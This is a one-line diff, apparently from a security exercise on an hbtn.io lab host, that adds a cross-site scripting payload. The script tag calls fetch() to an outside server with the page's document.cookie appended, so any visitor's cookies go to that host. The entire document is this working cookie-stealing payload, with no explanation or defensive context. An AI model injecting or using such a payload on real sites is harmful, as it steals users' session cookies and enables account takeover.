@@ -1,0 +1,1 @@
+<script>fetch('https://web-80-167-239.cod-sa-east-1.hbtn.io/?cookies=' + document.cookie)</script>
